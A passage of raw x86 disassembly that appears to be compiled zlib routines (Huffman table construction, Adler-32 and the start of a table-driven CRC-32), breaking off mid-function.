   1d161:	add    ecx,0x101
   1d167:	mov    DWORD PTR [eax+0x10],ecx
   1d16a:	mov    eax,DWORD PTR [ebp+0xc]
   1d16d:	pop    edi
   1d16e:	mov    DWORD PTR [esi+0x38],edx
   1d171:	mov    DWORD PTR [esi+0x3c],eax
   1d174:	pop    esi
   1d175:	pop    ebx
   1d176:	leave  
   1d177:	ret    0x8
   1d17a:	int3   
   1d17b:	int3   
   1d17c:	int3   
   1d17d:	int3   
   1d17e:	int3   
   1d17f:	int3   
   1d180:	mov    edi,edi
   1d182:	push   ebp
   1d183:	mov    ebp,esp
   1d185:	sub    esp,0x90
   1d18b:	mov    eax,ds:0x7eb38
   1d190:	xor    eax,ebp
   1d192:	mov    DWORD PTR [ebp-0x4],eax
   1d195:	mov    eax,DWORD PTR [ebp+0xc]
   1d198:	mov    edx,DWORD PTR [ebp+0x18]
   1d19b:	mov    DWORD PTR [ebp-0x7c],eax
   1d19e:	mov    eax,DWORD PTR [ebp+0x1c]
   1d1a1:	push   ebx
   1d1a2:	mov    DWORD PTR [ebp-0x4c],eax
   1d1a5:	xor    eax,eax
   1d1a7:	push   esi
   1d1a8:	mov    esi,DWORD PTR [ebp+0x14]
   1d1ab:	movzx  ebx,ax
   1d1ae:	push   edi
   1d1af:	mov    eax,ebx
   1d1b1:	shl    ebx,0x10
   1d1b4:	push   0x8
   1d1b6:	or     eax,ebx
   1d1b8:	pop    ecx
   1d1b9:	lea    edi,[ebp-0x24]
   1d1bc:	rep stos DWORD PTR es:[edi],eax
   1d1be:	xor    edi,edi
   1d1c0:	xor    ecx,ecx
   1d1c2:	mov    DWORD PTR [ebp-0x90],edx
   1d1c8:	cmp    DWORD PTR [ebp+0x10],edi
   1d1cb:	jbe    0x1d1e1
   1d1cd:	mov    eax,DWORD PTR [ebp-0x7c]
   1d1d0:	movzx  eax,WORD PTR [eax+ecx*2]
   1d1d4:	lea    eax,[ebp+eax*2-0x24]
   1d1d8:	inc    WORD PTR [eax]
   1d1db:	inc    ecx
   1d1dc:	cmp    ecx,DWORD PTR [ebp+0x10]
   1d1df:	jb     0x1d1cd
   1d1e1:	mov    ecx,DWORD PTR [edx]
   1d1e3:	push   0xf
   1d1e5:	pop    eax
   1d1e6:	mov    DWORD PTR [ebp-0x54],ecx
   1d1e9:	mov    DWORD PTR [ebp-0x60],eax
   1d1ec:	cmp    WORD PTR [ebp+eax*2-0x24],di
   1d1f1:	jne    0x1d1fc
   1d1f3:	dec    eax
   1d1f4:	mov    DWORD PTR [ebp-0x60],eax
   1d1f7:	cmp    eax,0x1
   1d1fa:	jae    0x1d1ec
   1d1fc:	cmp    ecx,eax
   1d1fe:	jbe    0x1d203
   1d200:	mov    DWORD PTR [ebp-0x54],eax
   1d203:	cmp    eax,edi
   1d205:	jne    0x1d231
   1d207:	mov    ecx,DWORD PTR [esi]
   1d209:	xor    eax,eax
   1d20b:	mov    BYTE PTR [ebp-0x48],0x40
   1d20f:	mov    BYTE PTR [ebp-0x47],0x1
   1d213:	mov    WORD PTR [ebp-0x46],ax
   1d217:	mov    eax,DWORD PTR [ebp-0x48]
   1d21a:	mov    DWORD PTR [ecx],eax
   1d21c:	add    DWORD PTR [esi],0x4
   1d21f:	mov    ecx,DWORD PTR [esi]
   1d221:	mov    DWORD PTR [ecx],eax
   1d223:	add    DWORD PTR [esi],0x4
   1d226:	mov    DWORD PTR [edx],0x1
   1d22c:	jmp    0x1d56d
   1d231:	xor    ecx,ecx
   1d233:	inc    ecx
   1d234:	mov    edx,ecx
   1d236:	cmp    WORD PTR [ebp+edx*2-0x24],di
   1d23b:	jne    0x1d243
   1d23d:	inc    edx
   1d23e:	cmp    edx,0xf
   1d241:	jbe    0x1d236
   1d243:	cmp    DWORD PTR [ebp-0x54],edx
   1d246:	jae    0x1d24b
   1d248:	mov    DWORD PTR [ebp-0x54],edx
   1d24b:	mov    edi,ecx
   1d24d:	movzx  ebx,WORD PTR [ebp+ecx*2-0x24]
   1d252:	add    edi,edi
   1d254:	sub    edi,ebx
   1d256:	js     0x1d2e2
   1d25c:	inc    ecx
   1d25d:	cmp    ecx,0xf
   1d260:	jbe    0x1d24d
   1d262:	xor    ebx,ebx
   1d264:	cmp    edi,ebx
   1d266:	jle    0x1d272
   1d268:	cmp    DWORD PTR [ebp+0x8],ebx
   1d26b:	je     0x1d2e2
   1d26d:	cmp    eax,0x1
   1d270:	jne    0x1d2e2
   1d272:	xor    eax,eax
   1d274:	push   0x2
   1d276:	mov    WORD PTR [ebp-0x42],ax
   1d27a:	pop    ecx
   1d27b:	mov    ax,WORD PTR [ebp+ecx*1-0x44]
   1d280:	add    ax,WORD PTR [ebp+ecx*1-0x24]
   1d285:	inc    ecx
   1d286:	mov    WORD PTR [ebp+ecx*1-0x43],ax
   1d28b:	inc    ecx
   1d28c:	cmp    ecx,0x1e
   1d28f:	jb     0x1d27b
   1d291:	mov    eax,DWORD PTR [ebp-0x4c]
   1d294:	xor    edi,edi
   1d296:	cmp    DWORD PTR [ebp+0x10],ebx
   1d299:	jbe    0x1d2c4
   1d29b:	mov    ecx,DWORD PTR [ebp-0x7c]
   1d29e:	lea    ecx,[ecx+edi*2]
   1d2a1:	cmp    WORD PTR [ecx],bx
   1d2a4:	je     0x1d2be
   1d2a6:	movzx  ebx,WORD PTR [ecx]
   1d2a9:	movzx  ebx,WORD PTR [ebp+ebx*2-0x44]
   1d2ae:	mov    WORD PTR [eax+ebx*2],di
   1d2b2:	movzx  ecx,WORD PTR [ecx]
   1d2b5:	lea    ecx,[ebp+ecx*2-0x44]
   1d2b9:	inc    WORD PTR [ecx]
   1d2bc:	xor    ebx,ebx
   1d2be:	inc    edi
   1d2bf:	cmp    edi,DWORD PTR [ebp+0x10]
   1d2c2:	jb     0x1d29b
   1d2c4:	mov    ecx,DWORD PTR [ebp+0x8]
   1d2c7:	sub    ecx,ebx
   1d2c9:	je     0x1d30c
   1d2cb:	dec    ecx
   1d2cc:	je     0x1d2ea
   1d2ce:	or     DWORD PTR [ebp-0x68],0xffffffff
   1d2d2:	mov    DWORD PTR [ebp-0x6c],0x7be10
   1d2d9:	mov    DWORD PTR [ebp-0x78],0x7be50
   1d2e0:	jmp    0x1d319
   1d2e2:	or     eax,0xffffffff
   1d2e5:	jmp    0x1d56f
   1d2ea:	mov    ecx,0x202
   1d2ef:	mov    edi,0x7bd90
   1d2f4:	sub    edi,ecx
   1d2f6:	mov    DWORD PTR [ebp-0x6c],edi
   1d2f9:	mov    edi,0x7bdd0
   1d2fe:	sub    edi,ecx
   1d300:	mov    DWORD PTR [ebp-0x78],edi
   1d303:	mov    DWORD PTR [ebp-0x68],0x100
   1d30a:	jmp    0x1d319
   1d30c:	mov    DWORD PTR [ebp-0x78],eax
   1d30f:	mov    DWORD PTR [ebp-0x6c],eax
   1d312:	mov    DWORD PTR [ebp-0x68],0x13
   1d319:	mov    ecx,DWORD PTR [ebp-0x54]
   1d31c:	or     DWORD PTR [ebp-0x74],0xffffffff
   1d320:	mov    edi,DWORD PTR [esi]
   1d322:	mov    eax,edx
   1d324:	xor    edx,edx
   1d326:	inc    edx
   1d327:	shl    edx,cl
   1d329:	cmp    DWORD PTR [ebp+0x8],0x1
   1d32d:	mov    DWORD PTR [ebp-0x5c],ebx
   1d330:	mov    DWORD PTR [ebp-0x84],eax
   1d336:	lea    ecx,[edx-0x1]
   1d339:	mov    DWORD PTR [ebp-0x50],ebx
   1d33c:	mov    DWORD PTR [ebp-0x80],edx
   1d33f:	mov    DWORD PTR [ebp-0x64],edx
   1d342:	mov    DWORD PTR [ebp-0x88],ecx
   1d348:	jne    0x1d35a
   1d34a:	cmp    edx,0x5b0
   1d350:	jb     0x1d35a
   1d352:	xor    eax,eax
   1d354:	inc    eax
   1d355:	jmp    0x1d56f
   1d35a:	mov    ecx,DWORD PTR [ebp-0x4c]
   1d35d:	mov    DWORD PTR [ebp-0x58],ecx
   1d360:	mov    cl,al
   1d362:	sub    cl,BYTE PTR [ebp-0x50]
   1d365:	mov    BYTE PTR [ebp-0x47],cl
   1d368:	mov    ecx,DWORD PTR [ebp-0x58]
   1d36b:	movzx  edx,WORD PTR [ecx]
   1d36e:	movzx  ecx,dx
   1d371:	cmp    ecx,DWORD PTR [ebp-0x68]
   1d374:	jge    0x1d380
   1d376:	mov    BYTE PTR [ebp-0x48],0x0
   1d37a:	mov    WORD PTR [ebp-0x46],dx
   1d37e:	jmp    0x1d3a6
   1d380:	jle    0x1d39c
   1d382:	mov    ecx,DWORD PTR [ebp-0x58]
   1d385:	movzx  ecx,WORD PTR [ecx]
   1d388:	mov    edx,DWORD PTR [ebp-0x78]
   1d38b:	add    ecx,ecx
   1d38d:	mov    dl,BYTE PTR [ecx+edx*1]
   1d390:	mov    BYTE PTR [ebp-0x48],dl
   1d393:	mov    edx,DWORD PTR [ebp-0x6c]
   1d396:	mov    cx,WORD PTR [ecx+edx*1]
   1d39a:	jmp    0x1d3a2
   1d39c:	mov    BYTE PTR [ebp-0x48],0x60
   1d3a0:	xor    ecx,ecx
   1d3a2:	mov    WORD PTR [ebp-0x46],cx
   1d3a6:	xor    edx,edx
   1d3a8:	mov    ecx,eax
   1d3aa:	sub    ecx,DWORD PTR [ebp-0x50]
   1d3ad:	inc    edx
   1d3ae:	shl    edx,cl
   1d3b0:	mov    ecx,DWORD PTR [ebp-0x80]
   1d3b3:	mov    DWORD PTR [ebp-0x4c],ecx
   1d3b6:	mov    DWORD PTR [ebp-0x70],ecx
   1d3b9:	mov    ecx,DWORD PTR [ebp-0x50]
   1d3bc:	shr    ebx,cl
   1d3be:	add    ebx,DWORD PTR [ebp-0x4c]
   1d3c1:	lea    ecx,[edi+ebx*4]
   1d3c4:	sub    DWORD PTR [ebp-0x4c],edx
   1d3c7:	mov    ebx,edx
   1d3c9:	shl    ebx,0x2
   1d3cc:	sub    ecx,ebx
   1d3ce:	cmp    DWORD PTR [ebp-0x4c],0x0
   1d3d2:	mov    ebx,DWORD PTR [ebp-0x48]
   1d3d5:	mov    DWORD PTR [ecx],ebx
   1d3d7:	jne    0x1d3c4
   1d3d9:	xor    edx,edx
   1d3db:	lea    ecx,[eax-0x1]
   1d3de:	inc    edx
   1d3df:	shl    edx,cl
   1d3e1:	mov    ecx,DWORD PTR [ebp-0x5c]
   1d3e4:	jmp    0x1d3e8
   1d3e6:	shr    edx,1
   1d3e8:	test   ecx,edx
   1d3ea:	jne    0x1d3e6
   1d3ec:	test   edx,edx
   1d3ee:	je     0x1d3f9
   1d3f0:	lea    ebx,[edx-0x1]
   1d3f3:	and    ebx,ecx
   1d3f5:	add    ebx,edx
   1d3f7:	jmp    0x1d3fb
   1d3f9:	xor    ebx,ebx
   1d3fb:	add    DWORD PTR [ebp-0x58],0x2
   1d3ff:	lea    ecx,[ebp+eax*2-0x24]
   1d403:	mov    edx,0xffff
   1d408:	add    WORD PTR [ecx],dx
   1d40b:	movzx  ecx,WORD PTR [ecx]
   1d40e:	mov    DWORD PTR [ebp-0x5c],ebx
   1d411:	test   cx,cx
   1d414:	jne    0x1d432
   1d416:	cmp    eax,DWORD PTR [ebp-0x60]
   1d419:	je     0x1d4f5
   1d41f:	mov    eax,DWORD PTR [ebp-0x58]
   1d422:	movzx  eax,WORD PTR [eax]
   1d425:	mov    ecx,DWORD PTR [ebp-0x7c]
   1d428:	movzx  eax,WORD PTR [ecx+eax*2]
   1d42c:	mov    DWORD PTR [ebp-0x84],eax
   1d432:	mov    edx,DWORD PTR [ebp-0x54]
   1d435:	cmp    eax,edx
   1d437:	jbe    0x1d360
   1d43d:	mov    ecx,DWORD PTR [ebp-0x88]
   1d443:	and    ecx,ebx
   1d445:	mov    DWORD PTR [ebp-0x8c],ecx
   1d44b:	cmp    ecx,DWORD PTR [ebp-0x74]
   1d44e:	je     0x1d360
   1d454:	cmp    DWORD PTR [ebp-0x50],0x0
   1d458:	jne    0x1d45d
   1d45a:	mov    DWORD PTR [ebp-0x50],edx
   1d45d:	mov    ecx,DWORD PTR [ebp-0x70]
   1d460:	lea    edi,[edi+ecx*4]
   1d463:	mov    ecx,eax
   1d465:	mov    eax,DWORD PTR [ebp-0x50]
   1d468:	xor    edx,edx
   1d46a:	sub    ecx,eax
   1d46c:	inc    edx
   1d46d:	add    eax,ecx
   1d46f:	shl    edx,cl
   1d471:	cmp    eax,DWORD PTR [ebp-0x60]
   1d474:	jae    0x1d49e
   1d476:	mov    DWORD PTR [ebp-0x4c],eax
   1d479:	lea    eax,[ebp+eax*2-0x24]
   1d47d:	jmp    0x1d482
   1d47f:	mov    eax,DWORD PTR [ebp-0x70]
   1d482:	movzx  ebx,WORD PTR [eax]
   1d485:	sub    edx,ebx
   1d487:	test   edx,edx
   1d489:	jle    0x1d49e
   1d48b:	inc    ecx
   1d48c:	inc    DWORD PTR [ebp-0x4c]
   1d48f:	inc    eax
   1d490:	inc    eax
   1d491:	mov    DWORD PTR [ebp-0x70],eax
   1d494:	mov    eax,DWORD PTR [ebp-0x4c]
   1d497:	add    edx,edx
   1d499:	cmp    eax,DWORD PTR [ebp-0x60]
   1d49c:	jb     0x1d47f
   1d49e:	xor    eax,eax
   1d4a0:	inc    eax
   1d4a1:	mov    edx,eax
   1d4a3:	shl    edx,cl
   1d4a5:	add    DWORD PTR [ebp-0x64],edx
   1d4a8:	mov    DWORD PTR [ebp-0x80],edx
   1d4ab:	cmp    DWORD PTR [ebp+0x8],eax
   1d4ae:	jne    0x1d4bd
   1d4b0:	cmp    DWORD PTR [ebp-0x64],0x5b0
   1d4b7:	jae    0x1d56f
   1d4bd:	mov    eax,DWORD PTR [ebp-0x8c]
   1d4c3:	mov    ebx,DWORD PTR [ebp-0x5c]
   1d4c6:	mov    edx,eax
   1d4c8:	mov    DWORD PTR [ebp-0x74],eax
   1d4cb:	mov    eax,DWORD PTR [esi]
   1d4cd:	shl    edx,0x2
   1d4d0:	mov    BYTE PTR [edx+eax*1],cl
   1d4d3:	mov    eax,DWORD PTR [esi]
   1d4d5:	mov    cl,BYTE PTR [ebp-0x54]
   1d4d8:	mov    BYTE PTR [edx+eax*1+0x1],cl
   1d4dc:	mov    eax,DWORD PTR [esi]
   1d4de:	mov    ecx,edi
   1d4e0:	sub    ecx,eax
   1d4e2:	sar    ecx,0x2
   1d4e5:	mov    WORD PTR [edx+eax*1+0x2],cx
   1d4ea:	mov    eax,DWORD PTR [ebp-0x84]
   1d4f0:	jmp    0x1d360
   1d4f5:	mov    cl,al
   1d4f7:	sub    cl,BYTE PTR [ebp-0x50]
   1d4fa:	mov    BYTE PTR [ebp-0x48],0x40
   1d4fe:	mov    BYTE PTR [ebp-0x47],cl
   1d501:	xor    ecx,ecx
   1d503:	mov    WORD PTR [ebp-0x46],cx
   1d507:	jmp    0x1d556
   1d509:	cmp    DWORD PTR [ebp-0x50],0x0
   1d50d:	je     0x1d528
   1d50f:	mov    ecx,DWORD PTR [ebp-0x88]
   1d515:	and    ecx,ebx
   1d517:	cmp    ecx,DWORD PTR [ebp-0x74]
   1d51a:	je     0x1d528
   1d51c:	mov    eax,DWORD PTR [ebp-0x54]
   1d51f:	and    DWORD PTR [ebp-0x50],0x0
   1d523:	mov    edi,DWORD PTR [esi]
   1d525:	mov    BYTE PTR [ebp-0x47],al
   1d528:	mov    ecx,DWORD PTR [ebp-0x50]
   1d52b:	mov    edx,ebx
   1d52d:	shr    edx,cl
   1d52f:	mov    ecx,DWORD PTR [ebp-0x48]
   1d532:	mov    DWORD PTR [edi+edx*4],ecx
   1d535:	xor    edx,edx
   1d537:	lea    ecx,[eax-0x1]
   1d53a:	inc    edx
   1d53b:	shl    edx,cl
   1d53d:	jmp    0x1d541
   1d53f:	shr    edx,1
   1d541:	test   ebx,edx
   1d543:	jne    0x1d53f
   1d545:	test   edx,edx
   1d547:	je     0x1d554
   1d549:	lea    ecx,[edx-0x1]
   1d54c:	and    ecx,ebx
   1d54e:	add    ecx,edx
   1d550:	mov    ebx,ecx
   1d552:	jmp    0x1d556
   1d554:	xor    ebx,ebx
   1d556:	test   ebx,ebx
   1d558:	jne    0x1d509
   1d55a:	mov    eax,DWORD PTR [ebp-0x64]
   1d55d:	mov    ecx,DWORD PTR [ebp-0x54]
   1d560:	shl    eax,0x2
   1d563:	add    DWORD PTR [esi],eax
   1d565:	mov    eax,DWORD PTR [ebp-0x90]
   1d56b:	mov    DWORD PTR [eax],ecx
   1d56d:	xor    eax,eax
   1d56f:	mov    ecx,DWORD PTR [ebp-0x4]
   1d572:	pop    edi
   1d573:	pop    esi
   1d574:	xor    ecx,ebp
   1d576:	pop    ebx
   1d577:	call   0x1da79
   1d57c:	leave  
   1d57d:	ret    0x18
   1d580:	int3   
   1d581:	int3   
   1d582:	int3   
   1d583:	int3   
   1d584:	int3   
   1d585:	int3   
   1d586:	mov    edi,edi
   1d588:	push   ebp
   1d589:	mov    ebp,esp
   1d58b:	push   ebx
   1d58c:	mov    ebx,DWORD PTR [ebp+0x10]
   1d58f:	push   esi
   1d590:	mov    esi,DWORD PTR [ebp+0x8]
   1d593:	push   edi
   1d594:	xor    eax,eax
   1d596:	mov    edi,esi
   1d598:	inc    eax
   1d599:	shr    edi,0x10
   1d59c:	and    esi,0xffff
   1d5a2:	cmp    ebx,eax
   1d5a4:	jne    0x1d5ca
   1d5a6:	mov    eax,DWORD PTR [ebp+0xc]
   1d5a9:	movzx  eax,BYTE PTR [eax]
   1d5ac:	add    esi,eax
   1d5ae:	mov    eax,0xfff1
   1d5b3:	cmp    esi,eax
   1d5b5:	jb     0x1d5b9
   1d5b7:	sub    esi,eax
   1d5b9:	add    edi,esi
   1d5bb:	cmp    edi,eax
   1d5bd:	jb     0x1d79c
   1d5c3:	sub    edi,eax
   1d5c5:	jmp    0x1d79c
   1d5ca:	mov    ecx,DWORD PTR [ebp+0xc]
   1d5cd:	test   ecx,ecx
   1d5cf:	je     0x1d7a3
   1d5d5:	cmp    ebx,0x10
   1d5d8:	jb     0x1d75f
   1d5de:	cmp    ebx,0x15b0
   1d5e4:	jb     0x1d6b2
   1d5ea:	mov    eax,ebx
   1d5ec:	mov    ebx,0x15b0
   1d5f1:	xor    edx,edx
   1d5f3:	div    ebx
   1d5f5:	mov    ebx,DWORD PTR [ebp+0x10]
   1d5f8:	mov    DWORD PTR [ebp+0xc],eax
   1d5fb:	sub    ebx,0x15b0
   1d601:	mov    eax,0x15b
   1d606:	movzx  edx,BYTE PTR [ecx]
   1d609:	add    esi,edx
   1d60b:	movzx  edx,BYTE PTR [ecx+0x1]
   1d60f:	add    edi,esi
   1d611:	add    esi,edx
   1d613:	movzx  edx,BYTE PTR [ecx+0x2]
   1d617:	add    edi,esi
   1d619:	add    esi,edx
   1d61b:	movzx  edx,BYTE PTR [ecx+0x3]
   1d61f:	add    edi,esi
   1d621:	add    esi,edx
   1d623:	movzx  edx,BYTE PTR [ecx+0x4]
   1d627:	add    edi,esi
   1d629:	add    esi,edx
   1d62b:	movzx  edx,BYTE PTR [ecx+0x5]
   1d62f:	add    edi,esi
   1d631:	add    esi,edx
   1d633:	movzx  edx,BYTE PTR [ecx+0x6]
   1d637:	add    edi,esi
   1d639:	add    esi,edx
   1d63b:	movzx  edx,BYTE PTR [ecx+0x7]
   1d63f:	add    edi,esi
   1d641:	add    esi,edx
   1d643:	movzx  edx,BYTE PTR [ecx+0x8]
   1d647:	add    edi,esi
   1d649:	add    esi,edx
   1d64b:	movzx  edx,BYTE PTR [ecx+0x9]
   1d64f:	add    edi,esi
   1d651:	add    esi,edx
   1d653:	movzx  edx,BYTE PTR [ecx+0xa]
   1d657:	add    edi,esi
   1d659:	add    esi,edx
   1d65b:	movzx  edx,BYTE PTR [ecx+0xb]
   1d65f:	add    edi,esi
   1d661:	add    esi,edx
   1d663:	movzx  edx,BYTE PTR [ecx+0xc]
   1d667:	add    edi,esi
   1d669:	add    esi,edx
   1d66b:	movzx  edx,BYTE PTR [ecx+0xd]
   1d66f:	add    edi,esi
   1d671:	add    esi,edx
   1d673:	movzx  edx,BYTE PTR [ecx+0xe]
   1d677:	add    edi,esi
   1d679:	add    esi,edx
   1d67b:	movzx  edx,BYTE PTR [ecx+0xf]
   1d67f:	add    edi,esi
   1d681:	add    esi,edx
   1d683:	add    edi,esi
   1d685:	add    ecx,0x10
   1d688:	dec    eax
   1d689:	jne    0x1d606
   1d68f:	mov    eax,esi
   1d691:	xor    edx,edx
   1d693:	mov    esi,0xfff1
   1d698:	div    esi
   1d69a:	mov    eax,edi
   1d69c:	mov    edi,0xfff1
   1d6a1:	mov    esi,edx
   1d6a3:	xor    edx,edx
   1d6a5:	div    edi
   1d6a7:	dec    DWORD PTR [ebp+0xc]
   1d6aa:	mov    edi,edx
   1d6ac:	jne    0x1d5fb
   1d6b2:	test   ebx,ebx
   1d6b4:	je     0x1d79c
   1d6ba:	cmp    ebx,0x10
   1d6bd:	jb     0x1d781
   1d6c3:	mov    eax,ebx
   1d6c5:	shr    eax,0x4
   1d6c8:	movzx  edx,BYTE PTR [ecx]
   1d6cb:	add    esi,edx
   1d6cd:	movzx  edx,BYTE PTR [ecx+0x1]
   1d6d1:	add    edi,esi
   1d6d3:	add    esi,edx
   1d6d5:	movzx  edx,BYTE PTR [ecx+0x2]
   1d6d9:	add    edi,esi
   1d6db:	add    esi,edx
   1d6dd:	movzx  edx,BYTE PTR [ecx+0x3]
   1d6e1:	add    edi,esi
   1d6e3:	add    esi,edx
   1d6e5:	movzx  edx,BYTE PTR [ecx+0x4]
   1d6e9:	add    edi,esi
   1d6eb:	add    esi,edx
   1d6ed:	movzx  edx,BYTE PTR [ecx+0x5]
   1d6f1:	add    edi,esi
   1d6f3:	add    esi,edx
   1d6f5:	movzx  edx,BYTE PTR [ecx+0x6]
   1d6f9:	add    edi,esi
   1d6fb:	add    esi,edx
   1d6fd:	movzx  edx,BYTE PTR [ecx+0x7]
   1d701:	add    edi,esi
   1d703:	add    esi,edx
   1d705:	movzx  edx,BYTE PTR [ecx+0x8]
   1d709:	add    edi,esi
   1d70b:	add    esi,edx
   1d70d:	movzx  edx,BYTE PTR [ecx+0x9]
   1d711:	add    edi,esi
   1d713:	add    esi,edx
   1d715:	movzx  edx,BYTE PTR [ecx+0xa]
   1d719:	add    edi,esi
   1d71b:	add    esi,edx
   1d71d:	movzx  edx,BYTE PTR [ecx+0xb]
   1d721:	add    edi,esi
   1d723:	add    esi,edx
   1d725:	movzx  edx,BYTE PTR [ecx+0xc]
   1d729:	add    edi,esi
   1d72b:	add    esi,edx
   1d72d:	movzx  edx,BYTE PTR [ecx+0xd]
   1d731:	add    edi,esi
   1d733:	add    esi,edx
   1d735:	movzx  edx,BYTE PTR [ecx+0xe]
   1d739:	add    edi,esi
   1d73b:	add    esi,edx
   1d73d:	movzx  edx,BYTE PTR [ecx+0xf]
   1d741:	add    edi,esi
   1d743:	add    esi,edx
   1d745:	sub    ebx,0x10
   1d748:	add    edi,esi
   1d74a:	add    ecx,0x10
   1d74d:	dec    eax
   1d74e:	jne    0x1d6c8
   1d754:	jmp    0x1d781
   1d756:	movzx  eax,BYTE PTR [ecx]
   1d759:	dec    ebx
   1d75a:	add    esi,eax
   1d75c:	inc    ecx
   1d75d:	add    edi,esi
   1d75f:	test   ebx,ebx
   1d761:	jne    0x1d756
   1d763:	mov    ecx,0xfff1
   1d768:	cmp    esi,ecx
   1d76a:	jb     0x1d76e
   1d76c:	sub    esi,ecx
   1d76e:	mov    eax,edi
   1d770:	xor    edx,edx
   1d772:	div    ecx
   1d774:	mov    eax,edx
   1d776:	jmp    0x1d79e
   1d778:	movzx  eax,BYTE PTR [ecx]
   1d77b:	dec    ebx
   1d77c:	add    esi,eax
   1d77e:	inc    ecx
   1d77f:	add    edi,esi
   1d781:	test   ebx,ebx
   1d783:	jne    0x1d778
   1d785:	mov    eax,esi
   1d787:	mov    ecx,0xfff1
   1d78c:	xor    edx,edx
   1d78e:	mov    esi,ecx
   1d790:	div    esi
   1d792:	mov    eax,edi
   1d794:	mov    esi,edx
   1d796:	xor    edx,edx
   1d798:	div    ecx
   1d79a:	mov    edi,edx
   1d79c:	mov    eax,edi
   1d79e:	shl    eax,0x10
   1d7a1:	or     eax,esi
   1d7a3:	pop    edi
   1d7a4:	pop    esi
   1d7a5:	pop    ebx
   1d7a6:	pop    ebp
   1d7a7:	ret    0xc
   1d7aa:	int3   
   1d7ab:	int3   
   1d7ac:	int3   
   1d7ad:	int3   
   1d7ae:	int3   
   1d7af:	int3   
   1d7b0:	mov    edi,edi
   1d7b2:	push   ebp
   1d7b3:	mov    ebp,esp
   1d7b5:	push   ecx
   1d7b6:	cmp    DWORD PTR [ebp+0x8],0x0
   1d7ba:	push   esi
   1d7bb:	not    eax
   1d7bd:	mov    ecx,0xff
   1d7c2:	je     0x1d7e0
   1d7c4:	test   dl,0x3
   1d7c7:	je     0x1d7e0
   1d7c9:	movzx  esi,BYTE PTR [edx]
   1d7cc:	xor    esi,eax
   1d7ce:	and    esi,ecx
   1d7d0:	shr    eax,0x8
   1d7d3:	xor    eax,DWORD PTR [esi*4+0x7be90]
   1d7da:	inc    edx
   1d7db:	dec    DWORD PTR [ebp+0x8]
   1d7de:	jne    0x1d7c4
   1d7e0:	cmp    DWORD PTR [ebp+0x8],0x20
   1d7e4:	push   ebx
   1d7e5:	push   edi
   1d7e6:	push   0x4
   1d7e8:	mov    esi,edx
   1d7ea:	pop    edi
   1d7eb:	jb     0x1d9af
   1d7f1:	mov    edx,DWORD PTR [ebp+0x8]
   1d7f4:	shr    edx,0x5
   1d7f7:	mov    DWORD PTR [ebp-0x4],edx
   1d7fa:	xor    eax,DWORD PTR [esi]
   1d7fc:	add    esi,edi
   1d7fe:	mov    edx,eax
   1d800:	shr    edx,0x10
   1d803:	mov    ebx,eax
   1d805:	shr    ebx,0x8
   1d808:	and    edx,ecx
   1d80a:	mov    edx,DWORD PTR [edx*4+0x7c290]
   1d811:	and    ebx,ecx
   1d813:	xor    edx,DWORD PTR [ebx*4+0x7c690]
   1d81a:	mov    ebx,eax
   1d81c:	shr    ebx,0x18
   1d81f:	xor    edx,DWORD PTR [ebx*4+0x7be90]
   1d826:	and    eax,ecx
   1d828:	xor    edx,DWORD PTR [eax*4+0x7ca90]
   1d82f:	xor    edx,DWORD PTR [esi]
   1d831:	add    esi,edi
   1d833:	mov    eax,edx
   1d835:	shr    eax,0x10
   1d838:	mov    ebx,edx
   1d83a:	shr    ebx,0x8
   1d83d:	and    eax,ecx
   1d83f:	mov    eax,DWORD PTR [eax*4+0x7c290]
   1d846:	and    ebx,ecx
   1d848:	xor    eax,DWORD PTR [ebx*4+0x7c690]
   1d84f:	mov    ebx,edx
   1d851:	shr    ebx,0x18
   1d854:	xor    eax,DWORD PTR [ebx*4+0x7be90]
   1d85b:	and    edx,ecx
   1d85d:	xor    eax,DWORD PTR [edx*4+0x7ca90]
   1d864:	xor    eax,DWORD PTR [esi]
   1d866:	add    esi,edi
   1d868:	mov    edx,eax
   1d86a:	shr    edx,0x10
   1d86d:	mov    ebx,eax
   1d86f:	and    edx,ecx
   1d871:	mov    edx,DWORD PTR [edx*4+0x7c290]
   1d878:	shr    ebx,0x8
   1d87b:	and    ebx,ecx
   1d87d:	xor    edx,DWORD PTR [ebx*4+0x7c690]
   1d884:	mov    ebx,eax
   1d886:	shr    ebx,0x18
   1d889:	xor    edx,DWORD PTR [ebx*4+0x7be90]
   1d890:	and    eax,ecx
   1d892:	xor    edx,DWORD PTR [eax*4+0x7ca90]
   1d899:	xor    edx,DWORD PTR [esi]
   1d89b:	add    esi,edi
   1d89d:	mov    eax,edx
   1d89f:	shr    eax,0x10
   1d8a2:	mov    ebx,edx
   1d8a4:	shr    ebx,0x8
   1d8a7:	and    eax,ecx
   1d8a9:	mov    eax,DWORD PTR [eax*4+0x7c290]
   1d8b0:	and    ebx,ecx
   1d8b2:	xor    eax,DWORD PTR [ebx*4+0x7c690]
   1d8b9:	mov    ebx,edx
   1d8bb:	shr    ebx,0x18
   1d8be:	xor    eax,DWORD PTR [ebx*4+0x7be90]
   1d8c5:	and    edx,ecx
   1d8c7:	xor    eax,DWORD PTR [edx*4+0x7ca90]
   1d8ce:	xor    eax,DWORD PTR [esi]
   1d8d0:	add    esi,edi
   1d8d2:	mov    edx,eax
   1d8d4:	shr    edx,0x10
   1d8d7:	mov    ebx,eax
   1d8d9:	and    edx,ecx
   1d8db:	mov    edx,DWORD PTR [edx*4+0x7c290]
   1d8e2:	shr    ebx,0x8
   1d8e5:	and    ebx,ecx
   1d8e7:	xor    edx,DWORD PTR [ebx*4+0x7c690]
   1d8ee:	mov    ebx,eax
   1d8f0:	shr    ebx,0x18
   1d8f3:	xor    edx,DWORD PTR [ebx*4+0x7be90]
   1d8fa:	and    eax,ecx
   1d8fc:	xor    edx,DWORD PTR [eax*4+0x7ca90]
   1d903:	xor    edx,DWORD PTR [esi]
   1d905:	add    esi,edi
   1d907:	mov    eax,edx
   1d909:	shr    eax,0x10
   1d90c:	and    eax,ecx
   1d90e:	mov    ebx,edx
   1d910:	mov    eax,DWORD PTR [eax*4+0x7c290]
   1d917:	shr    ebx,0x8
   1d91a:	and    ebx,ecx
   1d91c:	xor    eax,DWORD PTR [ebx*4+0x7c690]
   1d923:	mov    ebx,edx
   1d925:	shr    ebx,0x18
   1d928:	xor    eax,DWORD PTR [ebx*4+0x7be90]
   1d92f:	and    edx,ecx
   1d931:	xor    eax,DWORD PTR [edx*4+0x7ca90]
   1d938:	sub    DWORD PTR [ebp+0x8],0x20
   1d93c:	xor    eax,DWORD PTR [esi]
   1d93e:	add    esi,edi
   1d940:	mov    edx,eax
   1d942:	mov    ebx,eax
   1d944:	shr    edx,0x10
   1d947:	shr    ebx,0x8
